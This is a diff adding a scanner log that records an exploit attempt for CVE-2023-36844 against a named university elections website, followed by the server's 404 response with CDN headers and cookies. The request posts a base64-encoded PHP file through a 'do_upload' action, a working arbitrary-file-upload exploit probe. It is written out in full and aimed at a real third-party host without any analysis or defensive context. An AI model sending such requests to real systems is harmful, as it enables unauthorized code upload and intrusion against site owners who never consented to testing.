@@ -1,0 +1,38 @@
+[CVE-2023-36844] Dumped HTTP request for https://elections.union.unimelb.edu.au/webauth_operation.php
+
+
+POST /webauth_operation.php HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 176
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,KCc8P3BocCBlY2hvIG1kNSgnQ1ZFLTIwMjMtMzY4NDQnKTt1bmxpbmsoX19GSUxFX18pOz8+Jyk=", "fileName": "bcbaa.php", "csize": 56}]
+[CVE-2023-36844] Dumped HTTP response https://elections.union.unimelb.edu.au/webauth_operation.php
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:17:32 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Set-Cookie: BIGipServer~app_icat_web_prod~pool_icat_web_prod_prod1_2=3259242412.20480.0000; path=/; Httponly; Secure
+Set-Cookie: visid_incap_3220071=vTIObfh6QCa25J9e1puV/Atyk2gAAAAAQUIPAAAAAAATQJ3aAZw4enbEwPuT7Q18; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: nlbi_3220071=OfuOP5zo7RBVgnp0yn8OZQAAAAAunetdeEp36sFRnMiH634e; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=OMyZWn8iMkgU6Larov5JAwtyk2gAAAAAqnSB2sxhs1kuvgwvaUgeyg==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Cdn: Imperva
+X-Iinfo: 3-2162517-2162522 NNYN CT(213 230 0) RT(1754493451427 28) q(0 0 4 -1) r(6 6) U24
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head><script src="/alband-Then-now-not-by-the-wortune-Vpon-his-Fee-" async></script>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.52 (Ubuntu) Server at elections.union.unimelb.edu.au Port 80</address>
+</body></html>
+
